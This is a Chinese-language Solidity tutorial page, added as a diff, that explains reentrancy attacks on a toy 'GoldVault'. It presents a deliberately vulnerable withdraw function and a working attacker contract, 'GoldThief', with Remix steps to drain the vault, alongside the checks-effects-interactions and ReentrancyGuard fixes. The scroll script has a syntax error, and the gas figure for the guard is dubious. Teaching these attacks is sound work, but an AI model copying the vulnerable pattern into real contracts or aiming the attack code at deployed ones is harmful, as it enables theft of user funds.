@@ -1,0 +1,835 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FortKnox - 金库堡垒 - Solidity学习</title>
+    <link href="https://fonts.googleapis.com/css2?family=Gochi+Hand&family=Reenie+Beanie&family=Comic+Neue:ital,wght@0,400;0,700;1,400&family=Fira+Code&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+    <style>
+        :root {
+            --primary: #4361ee;
+            --secondary: #3f37c9;
+            --accent: #4cc9f0;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --easy: #43AA8B;
+            --medium: #F8961E;
+            --hard: #E71D36;
+            --expert: #7209B7;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Comic Neue', cursive;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4edf9 100%);
+            color: var(--dark);
+            line-height: 1.8;
+            background-image: radial-gradient(#d0e3ff 1px, transparent 1px);
+            background-size: 30px 30px;
+        }
+        
+        .nav-bar {
+            background: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 15px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .back-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 10px;
+            font-family: 'Comic Neue', cursive;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .back-btn:hover {
+            background: var(--secondary);
+            transform: translateX(-3px);
+        }
+        
+        .nav-title {
+            font-family: 'Gochi Hand', cursive;
+            font-size: 1.3rem;
+            color: var(--secondary);
+        }
+        
+        .nav-right {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .nav-btn {
+            background: white;
+            border: 2px solid var(--primary);
+            color: var(--primary);
+            padding: 5px 15px;
+            border-radius: 8px;
+            font-family: 'Comic Neue', cursive;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+        }
+        
+        .nav-btn:hover {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+        
+        .hero-section {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 5px 5px 20px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+            border-top: 5px solid var(--accent);
+        }
+        
+        .hero-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        .hero-title {
+            flex: 1;
+            min-width: 250px;
+        }
+        
+        .day-badge {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 8px 20px;
+            border-radius: 15px;
+            font-family: 'Gochi Hand', cursive;
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+        
+        h1 {
+            font-family: 'Gochi Hand', cursive;
+            font-size: 2.8rem;
+            color: var(--secondary);
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .meta-tags {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        
+        .difficulty-badge {
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            color: white;
+            font-size: 1rem;
+        }
+        
+        .tag {
+            background: var(--light);
+            padding: 5px 15px;
+            border-radius: 15px;
+            color: var(--secondary);
+            font-size: 0.9rem;
+        }
+        
+        .section {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 25px;
+            box-shadow: 3px 3px 10px rgba(0,0,0,0.1);
+        }
+        
+        .section-title {
+            font-family: 'Gochi Hand', cursive;
+            font-size: 2rem;
+            color: var(--secondary);
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 3px dashed var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .key-points {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .key-point {
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            padding: 15px;
+            border-radius: 10px;
+            border-left: 4px solid var(--accent);
+        }
+        
+        .key-point-title {
+            font-weight: bold;
+            color: var(--primary);
+            margin-bottom: 5px;
+        }
+        
+        .concept-card {
+            background: linear-gradient(135deg, #e6f7ff, #d6f0ff);
+            border-left: 5px solid var(--primary);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        
+        .concept-title {
+            font-family: 'Gochi Hand', cursive;
+            font-size: 1.4rem;
+            color: var(--secondary);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        pre {
+            background: #282c34;
+            border-radius: 10px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 15px 0;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.3);
+        }
+        
+        code {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            color: #f8f8f2;
+        }
+        
+        .inline-code {
+            background: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Fira Code', monospace;
+            color: var(--hard);
+            font-size: 0.9em;
+        }
+        
+        .navigation-footer {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 40px;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .nav-footer-btn {
+            flex: 1;
+            min-width: 200px;
+            background: white;
+            border: 3px solid var(--primary);
+            padding: 20px;
+            border-radius: 15px;
+            text-decoration: none;
+            color: var(--dark);
+            transition: all 0.3s;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        
+        .nav-footer-btn:hover {
+            background: var(--primary);
+            color: white;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .nav-footer-label {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        .nav-footer-title {
+            font-family: 'Gochi Hand', cursive;
+            font-size: 1.3rem;
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .hero-section {
+                padding: 25px;
+            }
+            
+            .section {
+                padding: 20px;
+            }
+            
+            .key-points {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="nav-bar">
+        <div class="nav-left">
+            <a href="index.html" class="back-btn">
+                <i class="fas fa-arrow-left"></i> 返回首页
+            </a>
+            <span class="nav-title">第20天 - 重入攻击防护</span>
+        </div>
+        <div class="nav-right">
+            <a href="#concepts" class="nav-btn">📚 核心概念</a>
+            <a href="#code" class="nav-btn">💻 代码讲解</a>
+            <a href="#practice" class="nav-btn">🎯 实践</a>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="hero-section">
+            <div class="hero-header">
+                <div class="hero-title">
+                    <div class="day-badge">第 20 天 🏰</div>
+                    <h1>FortKnox - 金库堡垒</h1>
+                    <p class="subtitle">重入攻击的原理、演示与防护策略</p>
+                </div>
+                <div class="meta-tags">
+                    <div class="difficulty-badge" style="background: var(--hard);">
+                        🌳 高级
+                    </div>
+                    <span class="tag">重入</span>
+                    <span class="tag">安全</span>
+                    <span class="tag">ReentrancyGuard</span>
+                    <span class="tag">攻击防护</span>
+                </div>
+            </div>
+            
+            <div class="key-points">
+                <div class="key-point">
+                    <div class="key-point-title">📌 学习目标</div>
+                    <div>理解重入攻击原理和防护方法</div>
+                </div>
+                <div class="key-point">
+                    <div class="key-point-title">🎯 核心技能</div>
+                    <div>重入漏洞、nonReentrant、安全模式</div>
+                </div>
+                <div class="key-point">
+                    <div class="key-point-title">⏱️ 预计时间</div>
+                    <div>55分钟</div>
+                </div>
+                <div class="key-point">
+                    <div class="key-point-title">📊 主观感受难度</div>
+                    <div>⭐⭐⭐⭐⭐ 极难 - 重入攻击理解和防护机制实现</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section" id="concepts">
+            <h2 class="section-title">
+                <i class="fas fa-lightbulb"></i> 核心概念详解
+            </h2>
+            
+            <div class="concept-card">
+                <div class="concept-title">⚡ 重入攻击原理</div>
+                <p>重入攻击是智能合约最危险的漏洞之一，利用外部调用的执行时机：</p>
+                <div style="background: #f8d7da; padding: 15px; border-radius: 8px; margin: 15px 0;">
+                    <strong style="color: #721c24;">🔹 攻击流程</strong>
+                    <ol style="margin-left: 20px; margin-top: 10px; color: #721c24;">
+                        <li>攻击者调用受害合约的提取函数</li>
+                        <li>受害合约向攻击者转账ETH</li>
+                        <li>转账触发攻击者的receive/fallback函数</li>
+                        <li>攻击者在回调中再次调用提取函数</li>
+                        <li>由于状态未更新，攻击者可重复提取</li>
+                    </ol>
+                </div>
+                <pre><code class="language-solidity">// 易受攻击的提取函数
+function vulnerableWithdraw() external {
+    uint256 amount = goldBalance[msg.sender];
+    require(amount > 0, "No balance");
+    
+    // 危险：先转账，后更新状态
+    (bool success, ) = msg.sender.call{value: amount}("");
+    require(success, "Transfer failed");
+    
+    goldBalance[msg.sender] = 0;  // 状态更新太晚！
+}</code></pre>
+            </div>
+
+            <div class="concept-card">
+                <div class="concept-title">🛡️ 防护策略</div>
+                <p>有多种方法可以防止重入攻击：</p>
+                <div style="background: #d4edda; padding: 15px; border-radius: 8px; margin: 15px 0;">
+                    <strong style="color: #155724;">✅ 1. 检查-效果-交互模式</strong>
+                    <pre style="margin-top: 10px;"><code class="language-solidity">function safeWithdraw() external {
+    uint256 amount = goldBalance[msg.sender];
+    require(amount > 0, "No balance");
+    
+    // 先更新状态
+    goldBalance[msg.sender] = 0;
+    
+    // 后进行外部调用
+    (bool success, ) = msg.sender.call{value: amount}("");
+    require(success, "Transfer failed");
+}</code></pre>
+                </div>
+                <div style="background: #d1ecf1; padding: 15px; border-radius: 8px; margin: 15px 0;">
+                    <strong style="color: #0c5460;">✅ 2. 重入锁 (Reentrancy Guard)</strong>
+                    <pre style="margin-top: 10px;"><code class="language-solidity">modifier nonReentrant() {
+    require(_status != _ENTERED, "Reentrant call blocked");
+    _status = _ENTERED;
+    _;
+    _status = _NOT_ENTERED;
+}</code></pre>
+                </div>
+            </div>
+
+            <div class="concept-card">
+                <div class="concept-title">🔒 ReentrancyGuard 实现</div>
+                <p>重入锁是最常用的防护机制，通过状态变量跟踪执行状态：</p>
+                <pre><code class="language-solidity">contract ReentrancyGuard {
+    uint256 private _status;
+    uint256 private constant _NOT_ENTERED = 1;
+    uint256 private constant _ENTERED = 2;
+    
+    constructor() {
+        _status = _NOT_ENTERED;
+    }
+    
+    modifier nonReentrant() {
+        require(_status != _ENTERED, "Reentrant call blocked");
+        _status = _ENTERED;  // 设置为已进入状态
+        _;                   // 执行函数体
+        _status = _NOT_ENTERED;  // 重置状态
+    }
+}</code></pre>
+                <p><strong>工作原理：</strong></p>
+                <ul style="margin-left: 20px; margin-top: 10px; line-height: 1.8;">
+                    <li>函数执行前设置状态为"已进入"</li>
+                    <li>如果重入调用，检查失败，交易回滚</li>
+                    <li>函数执行完毕后重置状态</li>
+                    <li>Gas成本低，约增加2300 gas</li>
+                </ul>
+            </div>
+
+            <div class="concept-card">
+                <div class="concept-title">🎭 攻击合约示例</div>
+                <p>理解攻击者如何利用重入漏洞：</p>
+                <pre><code class="language-solidity">contract GoldThief {
+    GoldVault public vault;
+    uint256 public attackCount;
+    uint256 public maxAttacks = 3;
+    
+    constructor(address _vault) {
+        vault = GoldVault(_vault);
+    }
+    
+    // 发起攻击
+    function attack() external payable {
+        require(msg.value > 0, "Need ETH to attack");
+        
+        // 先存款获得余额
+        vault.deposit{value: msg.value}();
+        
+        // 重置攻击计数
+        attackCount = 0;
+        
+        // 开始攻击
+        vault.vulnerableWithdraw();
+    }
+    
+    // 接收ETH时触发重入
+    receive() external payable {
+        if (attackCount < maxAttacks && address(vault).balance > 0) {
+            attackCount++;
+            vault.vulnerableWithdraw();  // 重入调用！
+        }
+    }
+}</code></pre>
+                <p><strong>攻击效果：</strong>一次存款，多次提取，直到金库被掏空！</p>
+            </div>
+        </div>
+
+        <div class="section" id="code">
+            <h2 class="section-title">
+                <i class="fas fa-code"></i> 完整代码详解
+            </h2>
+            
+            <h3 style="color: var(--secondary); margin: 20px 0;">📄 金库合约 (包含漏洞和安全版本)</h3>
+            <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GoldVault {
+    mapping(address => uint256) public goldBalance;
+    
+    // 重入锁状态
+    uint256 private _status;
+    uint256 private constant _NOT_ENTERED = 1;
+    uint256 private constant _ENTERED = 2;
+    
+    event Deposit(address indexed user, uint256 amount);
+    event Withdrawal(address indexed user, uint256 amount);
+    event AttackAttempt(address indexed attacker, string reason);
+    
+    constructor() {
+        _status = _NOT_ENTERED;
+    }
+    
+    modifier nonReentrant() {
+        require(_status != _ENTERED, "Reentrant call blocked");
+        _status = _ENTERED;
+        _;
+        _status = _NOT_ENTERED;
+    }
+    
+    // 存款函数
+    function deposit() external payable {
+        require(msg.value > 0, "Must deposit something");
+        goldBalance[msg.sender] += msg.value;
+        emit Deposit(msg.sender, msg.value);
+    }
+    
+    // 易受攻击的提取函数
+    function vulnerableWithdraw() external {
+        uint256 amount = goldBalance[msg.sender];
+        require(amount > 0, "No balance to withdraw");
+        
+        // 危险：先转账，后更新状态
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "Transfer failed");
+        
+        goldBalance[msg.sender] = 0;  // 状态更新在转账之后！
+        emit Withdrawal(msg.sender, amount);
+    }
+    
+    // 安全的提取函数 (检查-效果-交互模式)
+    function safeWithdraw() external {
+        uint256 amount = goldBalance[msg.sender];
+        require(amount > 0, "No balance to withdraw");
+        
+        // 安全：先更新状态
+        goldBalance[msg.sender] = 0;
+        
+        // 后进行外部调用
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "Transfer failed");
+        
+        emit Withdrawal(msg.sender, amount);
+    }
+    
+    // 使用重入锁的提取函数
+    function guardedWithdraw() external nonReentrant {
+        uint256 amount = goldBalance[msg.sender];
+        require(amount > 0, "No balance to withdraw");
+        
+        goldBalance[msg.sender] = 0;
+        
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "Transfer failed");
+        
+        emit Withdrawal(msg.sender, amount);
+    }
+    
+    // 获取合约余额
+    function getContractBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+    
+    // 获取用户余额
+    function getUserBalance(address user) external view returns (uint256) {
+        return goldBalance[user];
+    }
+}</code></pre>
+
+            <h3 style="color: var(--secondary); margin: 30px 0 20px 0;">📄 攻击合约</h3>
+            <pre><code class="language-solidity">contract GoldThief {
+    GoldVault public vault;
+    uint256 public attackCount;
+    uint256 public maxAttacks = 5;  // 最多攻击5次
+    address public owner;
+    
+    event AttackStarted(uint256 initialDeposit);
+    event AttackStep(uint256 step, uint256 withdrawn);
+    event AttackCompleted(uint256 totalStolen);
+    
+    constructor(address _vault) {
+        vault = GoldVault(_vault);
+        owner = msg.sender;
+    }
+    
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not owner");
+        _;
+    }
+    
+    // 发起攻击
+    function attack() external payable onlyOwner {
+        require(msg.value > 0, "Need ETH to start attack");
+        
+        // 先存款获得提取权限
+        vault.deposit{value: msg.value}();
+        
+        emit AttackStarted(msg.value);
+        
+        // 重置攻击计数
+        attackCount = 0;
+        
+        // 开始攻击易受攻击的函数
+        vault.vulnerableWithdraw();
+        
+        emit AttackCompleted(address(this).balance);
+    }
+    
+    // 尝试攻击安全函数 (会失败)
+    function attemptSafeAttack() external payable onlyOwner {
+        require(msg.value > 0, "Need ETH to start attack");
+        
+        vault.deposit{value: msg.value}();
+        attackCount = 0;
+        
+        // 尝试攻击安全函数
+        vault.safeWithdraw();  // 这不会触发重入
+    }
+    
+    // 尝试攻击有守卫的函数 (会失败)
+    function attemptGuardedAttack() external payable onlyOwner {
+        require(msg.value > 0, "Need ETH to start attack");
+        
+        vault.deposit{value: msg.value}();
+        attackCount = 0;
+        
+        // 尝试攻击有重入锁的函数
+        vault.guardedWithdraw();  // 重入会被阻止
+    }
+    
+    // 接收ETH时触发重入攻击
+    receive() external payable {
+        if (attackCount < maxAttacks && address(vault).balance > 0) {
+            attackCount++;
+            emit AttackStep(attackCount, msg.value);
+            
+            // 重入调用！
+            vault.vulnerableWithdraw();
+        }
+    }
+    
+    // 提取盗取的资金
+    function withdraw() external onlyOwner {
+        payable(owner).transfer(address(this).balance);
+    }
+    
+    // 获取攻击者余额
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}</code></pre>
+
+            <div style="background: linear-gradient(135deg, #d4edda, #c3e6cb); border-left: 5px solid #28a745; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                <strong style="color: #155724;">✅ 防护效果对比</strong>
+                <p style="margin-top: 10px; color: #155724;">
+                    - <strong>vulnerableWithdraw:</strong> 可被重入攻击，资金被盗<br>
+                    - <strong>safeWithdraw:</strong> 使用CEI模式，攻击失败<br>
+                    - <strong>guardedWithdraw:</strong> 使用重入锁，攻击被阻止
+                </p>
+            </div>
+
+            <div style="background: #fff3cd; border-left: 5px solid #ffc107; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                <strong style="color: #856404;">⚠️ 真实案例</strong>
+                <p style="margin-top: 10px; color: #856404;">
+                    - <strong>The DAO (2016):</strong> 损失6000万美元，导致以太坊硬分叉<br>
+                    - <strong>Cream Finance (2021):</strong> 损失1.3亿美元<br>
+                    - <strong>Rari Capital (2022):</strong> 损失8000万美元<br>
+                    重入攻击至今仍是DeFi最大威胁之一！
+                </p>
+            </div>
+        </div>
+
+        <div class="section" id="practice">
+            <h2 class="section-title">
+                <i class="fas fa-dumbbell"></i> 实践与练习
+            </h2>
+            
+            <h3 style="color: var(--secondary); margin-bottom: 20px;">📝 Remix实战步骤</h3>
+            
+            <div style="margin: 30px 0;">
+                <h4 style="color: var(--primary); margin-bottom: 15px; font-size: 1.2rem;">步骤1: 部署金库合约</h4>
+                <ol style="margin: 10px 0 10px 25px; line-height: 2;">
+                    <li>部署GoldVault合约</li>
+                    <li>使用多个账户存入一些ETH</li>
+                    <li>检查合约余额和用户余额</li>
+                </ol>
+            </div>
+
+            <div style="margin: 30px 0;">
+                <h4 style="color: var(--primary); margin-bottom: 15px; font-size: 1.2rem;">步骤2: 部署攻击合约</h4>
+                <ol style="margin: 10px 0 10px 25px; line-height: 2;">
+                    <li>使用金库地址部署GoldThief合约</li>
+                    <li>确保攻击者账户有足够ETH</li>
+                </ol>
+            </div>
+
+            <div style="margin: 30px 0;">
+                <h4 style="color: var(--primary); margin-bottom: 15px; font-size: 1.2rem;">步骤3: 执行重入攻击</h4>
+                <ol style="margin: 10px 0 10px 25px; line-height: 2;">
+                    <li>调用<code class="inline-code">attack()</code>并发送少量ETH</li>
+                    <li>观察事件日志中的攻击过程</li>
+                    <li>检查金库余额变化</li>
+                    <li>查看攻击者获得的资金</li>
+                </ol>
+            </div>
+
+            <div style="margin: 30px 0;">
+                <h4 style="color: var(--primary); margin-bottom: 15px; font-size: 1.2rem;">步骤4: 测试安全函数</h4>
+                <ol style="margin: 10px 0 10px 25px; line-height: 2;">
+                    <li>重新向金库存入资金</li>
+                    <li>调用<code class="inline-code">attemptSafeAttack()</code></li>
+                    <li>调用<code class="inline-code">attemptGuardedAttack()</code></li>
+                    <li>观察攻击失败，资金安全</li>
+                </ol>
+            </div>
+
+            <div style="margin: 30px 0;">
+                <h4 style="color: var(--primary); margin-bottom: 15px; font-size: 1.2rem;">步骤5: 分析Gas消耗</h4>
+                <ol style="margin: 10px 0 10px 25px; line-height: 2;">
+                    <li>比较三种提取函数的Gas消耗</li>
+                    <li>观察重入锁的额外成本</li>
+                    <li>分析安全性与效率的权衡</li>
+                </ol>
+            </div>
+
+            <h3 style="color: var(--secondary); margin: 40px 0 20px 0;">🎯 挑战练习</h3>
+            <div style="background: linear-gradient(135deg, #fff9e6, #ffedd5); border-left: 5px solid var(--medium); padding: 25px; border-radius: 10px;">
+                <p style="font-weight: bold; margin-bottom: 15px; font-size: 1.1rem;">尝试以下改进:</p>
+                <ol style="margin-left: 25px; line-height: 2.2;">
+                    <li>实现跨函数重入攻击和防护</li>
+                    <li>创建只读重入攻击示例</li>
+                    <li>实现基于时间的重入锁</li>
+                    <li>添加紧急暂停功能</li>
+                    <li>创建多合约重入攻击场景</li>
+                    <li>实现Pull Payment模式防护</li>
+                </ol>
+            </div>
+
+            <h3 style="color: var(--secondary); margin: 40px 0 20px 0;">📚 扩展知识</h3>
+            
+            <div style="background: white; border: 2px solid var(--accent); padding: 20px; border-radius: 10px; margin: 20px 0;">
+                <h4 style="color: var(--primary); margin-bottom: 10px;">OpenZeppelin ReentrancyGuard</h4>
+                <pre><code class="language-solidity">import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+contract MyContract is ReentrancyGuard {
+    function withdraw() external nonReentrant {
+        // 受保护的函数
+    }
+}</code></pre>
+                <p style="margin-top: 10px;">实际项目中建议使用OpenZeppelin的标准实现，经过充分测试和优化。</p>
+            </div>
+
+            <div style="background: white; border: 2px solid var(--accent); padding: 20px; border-radius: 10px; margin: 20px 0;">
+                <h4 style="color: var(--primary); margin-bottom: 10px;">重入攻击类型对比</h4>
+                <table style="width: 100%; border-collapse: collapse; margin-top: 15px;">
+                    <tr style="background: var(--light);">
+                        <th style="padding: 10px; text-align: left; border-bottom: 2px solid var(--accent);">类型</th>
+                        <th style="padding: 10px; text-align: left; border-bottom: 2px solid var(--accent);">特点</th>
+                        <th style="padding: 10px; text-align: left; border-bottom: 2px solid var(--accent);">防护方法</th>
+                    </tr>
+                    <tr>
+                        <td style="padding: 10px;">单函数重入</td>
+                        <td style="padding: 10px;">重复调用同一函数</td>
+                        <td style="padding: 10px;">CEI模式、重入锁</td>
+                    </tr>
+                    <tr style="background: #f8f9fa;">
+                        <td style="padding: 10px;">跨函数重入</td>
+                        <td style="padding: 10px;">调用不同函数</td>
+                        <td style="padding: 10px;">全局重入锁</td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 10px;">只读重入</td>
+                        <td style="padding: 10px;">利用view函数</td>
+                        <td style="padding: 10px;">状态一致性检查</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <div class="navigation-footer">
+            <a href="contract-19.html" class="nav-footer-btn" style="border-color: var(--accent);">
+                <div class="nav-footer-label">← 上一个</div>
+                <div class="nav-footer-title">SignThis - 签名验证</div>
+            </a>
+            <a href="contract-21.html" class="nav-footer-btn" style="border-color: var(--accent);">
+                <div class="nav-footer-label">下一个 →</div>
+                <div class="nav-footer-title">SimpleNFT - 简单NFT</div>
+            </a>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/languages/solidity.min.js"></script>
+    <script>
+        hljs.highlightAll();
+        
+        // 平滑滚动
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href');
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
